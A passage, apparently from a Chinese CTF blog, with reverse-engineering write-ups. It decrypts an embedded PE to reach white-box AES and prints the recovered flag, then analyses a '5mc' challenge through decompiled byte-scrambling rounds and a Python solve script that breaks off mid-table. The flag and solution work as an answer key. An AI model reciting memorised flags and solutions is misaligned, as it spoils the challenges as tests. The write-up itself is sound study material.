<p>而后用得到的密钥<code>B7 BC 71 42</code>对密文进行解密，可以发现能够得到正确的pe格式</p>
<p>里面是一个白盒aes加密算法</p>
<p><img src="/1763435254333-11.png" alt="img"></p>
<p><img src="/1763435254333-12.png" alt="img"></p>
<p>key&#x3D; 009CF29131C8E4EA81BD5DD248E6F3E0</p>
<p>密文：61E2312BDB5D41BF03F604A7F478680E41AB532035C2B87894E140F40A9F0F0795C6208C653C8C2732B026A83614F04F6D44CB66BB784726881EABC3FDF283CB</p>
<p>flag{7h3_Pyr4m1d_0f_Py7h0n_4w4175_175_M4573r_R3v3r53r_uJ6gG3qVs}</p>
<h3 id="5mc"><a href="#5mc" class="headerlink" title="5mc"></a>5mc</h3><p>程序首先判断输入长度是不是32</p>
<p>前面一大堆都是生成伪随机数的，不重要，直接运行到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((void (__fastcall *)(char *, _UNKNOWN **))v30)(Buf1, &amp;off_7FF66E835068);</span><br></pre></td></tr></table></figure>

<p>这个函数会对输入的flag做处理</p>
<p>第一次处理</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_29F4C630000</span><span class="params">(__int64 a1, __int64 *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = *a2;</span><br><span class="line">  v3 = *a2;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(v3 + *(<span class="type">unsigned</span> __int8 *)(a1 + i));</span><br><span class="line">    *(_BYTE *)(a1 + i) = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现十六次循环，每次循环这个函数都会变，但是第二个参数box不变</p>
<p>第二次：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1908DB00000</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v3[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = *(_QWORD *)(a2 + <span class="number">8</span>);</span><br><span class="line">  v5 = result;</span><br><span class="line">  v4 = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> __int8 *)(i + a1);</span><br><span class="line">    v3[*(<span class="type">unsigned</span> __int8 *)(v5 + i)] = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">31</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)v3[j];</span><br><span class="line">    *(_BYTE *)(*(<span class="type">unsigned</span> __int8 *)(v5 + j) + a1) = result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第三次:</p>
<p>第四次</p>
<p>然后上次四次操作循环四次，一共十六次操作</p>
<p>2</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">_BYTE <span class="operator">*</span>__fastcall sub_15E430F0000(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE <span class="operator">*</span><span class="keyword">result</span>; <span class="operator">/</span><span class="operator">/</span> rax</span><br><span class="line">  _BYTE <span class="operator">*</span>v3; <span class="operator">/</span><span class="operator">/</span> [rsp<span class="operator">+</span><span class="number">8</span>h] [rbp<span class="number">-18</span>h]</span><br><span class="line">  __int64 v4; <span class="operator">/</span><span class="operator">/</span> [rsp<span class="operator">+</span><span class="number">10</span>h] [rbp<span class="number">-10</span>h]</span><br><span class="line">  <span class="type">int</span> i; <span class="operator">/</span><span class="operator">/</span> [rsp<span class="operator">+</span><span class="number">1</span>Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  v4 <span class="operator">=</span> <span class="operator">*</span>(_QWORD <span class="operator">*</span>)(a2 <span class="operator">+</span> <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> <span class="operator">*</span>(_BYTE <span class="operator">*</span><span class="operator">*</span>)(a2 <span class="operator">+</span> <span class="number">24</span>);</span><br><span class="line">  v3 <span class="operator">=</span> <span class="keyword">result</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i <span class="operator">=</span> <span class="number">0</span>; i <span class="operator">&lt;=</span> <span class="number">31</span>; <span class="operator">+</span><span class="operator">+</span>i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="operator">*</span>(_BYTE <span class="operator">*</span>)(a1 <span class="operator">+</span> i) <span class="operator">=</span> (<span class="operator">*</span>(_BYTE <span class="operator">*</span>)(v4 <span class="operator">+</span> i) <span class="operator">^</span> <span class="operator">*</span>(_BYTE <span class="operator">*</span>)(a1 <span class="operator">+</span> i)) <span class="operator">+</span> v3[i];</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> (_BYTE <span class="operator">*</span>)(a1 <span class="operator">+</span> i);</span><br><span class="line">    <span class="operator">*</span><span class="keyword">result</span> <span class="operator">=</span> ((<span class="type">int</span>)(unsigned __int8)<span class="operator">*</span><span class="keyword">result</span> <span class="operator">&gt;&gt;</span> <span class="number">2</span>) <span class="operator">|</span> (<span class="operator">*</span><span class="keyword">result</span> <span class="operator">&lt;&lt;</span> <span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_BYTE <span class="operator">*</span>__fastcall sub_15E430F0000(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE <span class="operator">*</span><span class="keyword">result</span>; <span class="operator">/</span><span class="operator">/</span> rax</span><br><span class="line">  _BYTE <span class="operator">*</span>v3; <span class="operator">/</span><span class="operator">/</span> [rsp<span class="operator">+</span><span class="number">8</span>h] [rbp<span class="number">-18</span>h]</span><br><span class="line">  __int64 v4; <span class="operator">/</span><span class="operator">/</span> [rsp<span class="operator">+</span><span class="number">10</span>h] [rbp<span class="number">-10</span>h]</span><br><span class="line">  <span class="type">int</span> i; <span class="operator">/</span><span class="operator">/</span> [rsp<span class="operator">+</span><span class="number">1</span>Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  v4 <span class="operator">=</span> <span class="operator">*</span>(_QWORD <span class="operator">*</span>)(a2 <span class="operator">+</span> <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> <span class="operator">*</span>(_BYTE <span class="operator">*</span><span class="operator">*</span>)(a2 <span class="operator">+</span> <span class="number">24</span>);</span><br><span class="line">  v3 <span class="operator">=</span> <span class="keyword">result</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i <span class="operator">=</span> <span class="number">0</span>; i <span class="operator">&lt;=</span> <span class="number">31</span>; <span class="operator">+</span><span class="operator">+</span>i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="operator">*</span>(_BYTE <span class="operator">*</span>)(a1 <span class="operator">+</span> i) <span class="operator">=</span> <span class="operator">*</span>(_BYTE <span class="operator">*</span>)(v4 <span class="operator">+</span> i) <span class="operator">^</span> (<span class="operator">*</span>(_BYTE <span class="operator">*</span>)(a1 <span class="operator">+</span> i) <span class="operator">+</span> v3[i]);</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> (_BYTE <span class="operator">*</span>)(a1 <span class="operator">+</span> i);</span><br><span class="line">    <span class="operator">*</span><span class="keyword">result</span> <span class="operator">=</span> ((<span class="type">int</span>)(unsigned __int8)<span class="operator">*</span><span class="keyword">result</span> <span class="operator">&gt;&gt;</span> <span class="number">4</span>) <span class="operator">|</span> (<span class="number">16</span> <span class="operator">*</span> <span class="operator">*</span><span class="keyword">result</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">result</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall sub_15E430F0000(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  _BYTE *v3; // [rsp+8h] [rbp-18h]</span><br><span class="line">  __int64 v4; // [rsp+10h] [rbp-10h]</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(a2 + <span class="number">16</span>);</span><br><span class="line">  result = *(_BYTE **)(a2 + <span class="number">24</span>);</span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = (*(_BYTE *)(v4 + i) ^ *(_BYTE *)(a1 + i)) + v3[i];</span><br><span class="line">    result = (_BYTE *)(a1 + i);</span><br><span class="line">    *result = ((<span class="built_in">int</span>)(unsigned __int8)*result &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * *result);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BYTE *__fastcall sub_15E430F0000(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  _BYTE *v3; // [rsp+8h] [rbp-18h]</span><br><span class="line">  __int64 v4; // [rsp+10h] [rbp-10h]</span><br><span class="line">  <span class="built_in">int</span> i; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(a2 + <span class="number">16</span>);</span><br><span class="line">  result = *(_BYTE **)(a2 + <span class="number">24</span>);</span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(v4 + i) ^ (*(_BYTE *)(a1 + i) + v3[i]);</span><br><span class="line">    result = (_BYTE *)(a1 + i);</span><br><span class="line">    *result = ((<span class="built_in">int</span>)(unsigned __int8)*result &gt;&gt; <span class="number">3</span>) | (<span class="number">32</span> * *result);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>求解脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line">box=[    <span class="number">0xB0</span>, <span class="number">0xF0</span>, <span class="number">0x21</span>, <span class="number">0xCF</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x3A</span>, <span class="number">0x68</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>, </span><br><span class="line">  <span class="number">0x39</span>, <span class="number">0x86</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x9B</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x18</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0x2E</span>, <span class="number">0x6C</span>, <span class="number">0xDF</span>, <span class="number">0x2C</span>, <span class="number">0xAE</span>, <span class="number">0x65</span>, <span class="number">0x9D</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, </span><br><span class="line">  <span class="number">0xDA</span>, <span class="number">0xF4</span>, <span class="number">0xDE</span>, <span class="number">0xCA</span>, <span class="number">0x56</span>, <span class="number">0x92</span>, <span class="number">0x75</span>, <span class="number">0x3B</span>, <span class="number">0x62</span>, <span class="number">0x45</span>, </span><br><span class="line">  <span class="number">0x06</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x33</span>, <span class="number">0x6E</span>, <span class="number">0x25</span>, <span class="number">0xCE</span>, <span class="number">0xA3</span>, <span class="number">0xD2</span>, <span class="number">0x44</span>, </span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0x4A</span>, <span class="number">0x58</span>, <span class="number">0xB1</span>, <span class="number">0xA0</span>, <span class="number">0x2A</span>, <span class="number">0x47</span>, <span class="number">0x0A</span>, <span class="number">0x02</span>, <span class="number">0xAF</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0xC3</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0xE5</span>, <span class="number">0x0D</span>, <span class="number">0x67</span>, <span class="number">0x91</span>, <span class="number">0xE1</span>, <span class="number">0x51</span>, </span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0xC1</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0x72</span>, <span class="number">0x1C</span>, <span class="number">0x3F</span>, <span class="number">0xB8</span>, </span><br><span class="line">  <span class="number">0xE8</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0x7A</span>, <span class="number">0x73</span>, <span class="number">0x26</span>, <span class="number">0x54</span>, <span class="number">0x9E</span>, <span class="number">0xED</span>, <span class="number">0xA9</span>, </span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x20</span>, <span class="number">0xEF</span>, <span class="number">0xA6</span>, <span class="number">0x48</span>, <span class="number">0x97</span>, <span class="number">0x4F</span>, <span class="number">0xD4</span>, <span class="number">0xBB</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0x66</span>, <span class="number">0xD9</span>, <span class="number">0xE4</span>, <span class="number">0x0B</span>, <span class="number">0x30</span>, <span class="number">0x15</span>, <span class="number">0xD7</span>, <span class="number">0x6B</span>, <span class="number">0x19</span>, <span class="number">0xCD</span>, </span><br><span class="line">  <span class="number">0xC4</span>, <span class="number">0x08</span>, <span class="number">0xB4</span>, <span class="number">0xC8</span>, <span class="number">0x14</span>, <span class="number">0xFD</span>, <span class="number">0x7F</span>, <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x6F</span>, <span class="number">0xF5</span>, <span class="number">0x90</span>, <span class="number">0x76</span>, <span class="number">0xBF</span>, <span class="number">0x60</span>, <span class="number">0xE7</span>, <span class="number">0x24</span>, </span><br><span class="line">  <span class="number">0x78</span>, <span class="number">0x6D</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x43</span>, <span class="number">0xB5</span>, <span class="number">0x0C</span>, <span class="number">0x31</span>, <span class="number">0xF9</span>, <span class="number">0xA2</span>, </span><br><span class="line">  <span class="number">0x9C</span>, <span class="number">0x99</span>, <span class="number">0xF6</span>, <span class="number">0x2D</span>, <span class="number">0xDB</span>, <span class="number">0xB7</span>, <span class="number">0xC9</span>, <span class="number">0x85</span>, <span class="number">0x81</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0x1D</span>, <span class="number">0x07</span>, <span class="number">0x34</span>, <span class="number">0x5A</span>, <span class="number">0xBD</span>, <span class="number">0x37</span>, <span class="number">0x4C</span>, <span class="number">0xA7</span>, <span class="number">0x5F</span>, </span><br><span class="line">  <span class="number">0x46</span>, <span class="number">0xE9</span>, <span class="number">0x35</span>, <span class="number">0x93</span>, <span class="number">0x8D</span>, <span class="number">0xA5</span>, <span class="number">0xFB</span>, <span class="number">0x42</span>, <span class="number">0x01</span>, <span class="number">0xC2</span>, </span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x53</span>, <span class="number">0x83</span>, <span class="number">0x4D</span>, <span class="number">0xB2</span>, <span class="number">0x10</span>, </span><br><span class="line">  <span class="number">0x2B</span>, <span class="number">0xF8</span>, <span class="number">0x88</span>, <span class="number">0x6A</span>, <span class="number">0x3E</span>, <span class="number">0xD0</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x40</span>, <span class="number">0x27</span>, </span><br><span class="line">  <span class="number">0xBE</span>, <span class="number">0xD5</span>, <span class="number">0x38</span>, <span class="number">0xD1</span>, <span class="number">0x74</span>, <span class="number">0xB6</span>, <span class="number">0x57</span>, <span class="number">0x94</span>, <span class="number">0xAB</span>, <span class="number">0x8A</span>, </span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0xBC</span>, <span class="number">0x7D</span>, <span class="number">0xB3</span>, <span class="number">0x96</span>, <span class="number">0x7E</span>, <span class="number">0xFC</span>, <span class="number">0xAD</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, </span><br><span class="line">  <span class="number">0xFA</span>, <span class="number">0xE0</span>, <span class="number">0xCB</span>, <span class="number">0x8B</span>, <span class="number">0xEE</span>, <span class="number">0x32</span>, <span class="number">0xA4</span>, <span class="number">0x16</span>, <span class="number">0xFE</span>, <span class="number">0x5B</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0xDD</span>, <span class="number">0xC0</span>, <span class="number">0x9A</span>, <span class="number">0x5E</span>, <span class="number">0x8E</span>, <span class="number">0x29</span>, <span class="number">0xF3</span>, <span class="number">0x8F</span>, <span class="number">0x49</span>, </span><br><span class="line">  <span class="number">0xE6</span>, <span class="number">0x9F</span>, <span class="number">0xF1</span>, <span class="number">0xC5</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0x8C</span>, <span class="number">0x11</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x00</span>, <span class="number">0xAC</span>, <span class="number">0x89</span>, <span class="number">0xD3</span>, <span class="number">0x82</span>, <span class="number">0x69</span>, <span class="number">0xD6</span>, <span class="number">0xBA</span>, <span class="number">0xD8</span>, </span><br><span class="line">  <span class="number">0x59</span>, <span class="number">0x98</span>, <span class="number">0x09</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xC7</span>]</span><br><span class="line"></span><br><span class="line">box1=[ <span class="number">0x13</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x1D</span>, <span class="number">0x01</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x15</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x12</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x14</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x1E</span>, <span class="number">0x19</span>, <span class="number">0x09</span>, <span class="number">0x1B</span>, <span class="number">0x11</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0x0A</span>]</span><br><span class="line"></span><br><span class="line">v4=[  <span class="number">0x7D</span>, <span class="number">0xB7</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0xC3</span>, <span class="number">0x6B</span>, <span class="number">0xBD</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0x13</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x43</span>, <span class="number">0xCD</span>, <span class="number">0x6B</span>, <span class="number">0xCF</span>, <span class="number">0x18</span>, <span class="number">0x4F</span>, <span class="number">0x26</span>, <span class="number">0x18</span>, </span><br><span class="line">  <span class="number">0x12</span>, <span class="number">0x2A</span>, <span class="number">0x7E</span>, <span class="number">0x9B</span>, <span class="number">0x27</span>, <span class="number">0x4C</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, <span class="number">0x40</span>, <span class="number">0xC9</span>, </span><br><span class="line">  <span class="number">0x9E</span>, <span class="number">0xC4</span>]</span><br><span class="line"></span><br><span class="line">box2=[  <span class="number">0x91</span>, <span class="number">0xDB</span>, <span class="number">0x9F</span>, <span class="number">0x5F</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>, <span class="number">0xBF</span>, <span class="number">0x41</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x79</span>, <span class="number">0xDE</span>, <span class="number">0x73</span>, <span class="number">0x16</span>, <span class="number">0xF8</span>, <span class="number">0x1E</span>, <span class="number">0xBA</span>, <span class="number">0x6A</span>, <span class="number">0xBE</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x12</span>, <span class="number">0xB2</span>, <span class="number">0x39</span>, <span class="number">0x9E</span>, <span class="number">0xF3</span>, <span class="number">0x12</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x1C</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x43</span>]</span><br><span class="line"></span><br><span class="line">result =[ <span class="number">0x5B</span>, <span class="number">0x2D</span>, <span class="number">0xE9</span>, <span class="number">0x66</span>, <span class="number">0xED</span>, <span class="number">0x39</span>, <span class="number">0x90</span>, <span class="number">0x23</span>, <span class="number">0xAF</span>, <span class="number">0xDA</span>, </span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x2E</span>, <span class="number">0xD1</span>, <span class="number">0x0D</span>, <span class="number">0xBB</span>, <span class="number">0xBD</span>, <span class="number">0x57</span>, <span class="number">0x52</span>, <span class="number">0x02</span>, <span class="number">0xB0</span>, </span><br><span class="line">  <span class="number">0xBA</span>, <span class="number">0x9D</span>, <span class="number">0x52</span>, <span class="number">0xFA</span>, <span class="number">0x67</span>, <span class="number">0xEE</span>, <span class="number">0xA3</span>, <span class="number">0x85</span>, <span class="number">0xA9</span>, <span class="number">0x84</span>, </span><br><span 